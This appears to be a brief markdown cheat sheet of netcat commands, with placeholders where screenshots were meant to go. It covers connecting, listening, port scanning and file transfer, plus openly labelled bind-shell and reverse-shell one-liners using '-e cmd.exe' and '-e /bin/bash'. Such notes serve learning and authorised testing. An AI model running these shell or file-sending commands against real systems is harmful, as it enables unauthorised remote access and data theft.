# netcat 

* ***connect to tcp/udp***

```shell
nc -nv 192.168.10.1 22 
```
screen shot 

* ***command flags***
```
-l: Listen mode 
-L: Listen harder ( WINDOWS VERSION ).
-u: UDP 
-p: Local port 
-e: Program to execute after connection occurs ( cmd.exe , /bin/bash .....)
-n: Don’t perform DNS lookups on names of machines on the other side
-z: Zero-I/O mode (Don’t send any data, just emit a packet without payload)
-wN: Timeout for connects, waits for N seconds after closure of STDIN. 
-v: verbose mode .
-vv: Be very verbose .
```

* ***Listening on a tcp/udp***

```shell
nc -nvlp 1337

```
scrren shot 

* ***File Transfer***

```shell
nc -nvlp 1337 > out_file.txt
```
```shell
nc -nv 10.10.10.10 1337 < ~/home/mastermind/in_file.txt
```

screen shots 

* ***bind shell*** 
```shell
nc -lnvp 1337 -e cmd.exe
```
```shell
nc -nv target_ip port 
```

* ***Reverse Shell***
```shell
nc -lnvp 1337 
```
```shell
nc -nv 10.10.10.10 1337 -e /bin/bash
```
* ***Port Scanner***

```shell
nc -nvz -w3 10.10.10.10 100-120  # 100-120 ip range
```
screnn shot 
